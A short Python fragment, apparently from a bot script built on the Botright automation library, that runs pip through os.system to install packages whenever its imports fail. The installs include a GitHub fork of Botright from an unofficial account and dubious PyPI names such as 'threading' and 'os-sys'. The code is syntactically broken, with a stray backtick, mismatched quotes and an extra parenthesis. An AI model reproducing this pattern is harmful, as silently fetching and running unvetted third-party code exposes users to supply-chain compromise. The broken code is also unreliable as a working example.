...
try:
    import botright, threading, random, time, sys
    self.logger.info("Imports successful!")
    time.sleep(1)
    
except:
    self.logger.info("\nImports failed! Trying to install...")
    z = "python -m pip install "; os.system("%sgit+`'https://github.com/FuckingToasters/Botright'" % (z)); os.system('%shttpx' % (z)); os.system('%svalidators=0.20.0' % (z)); os.system('%sthreading' % (z)); os.system('%sos-sys' % (z)))
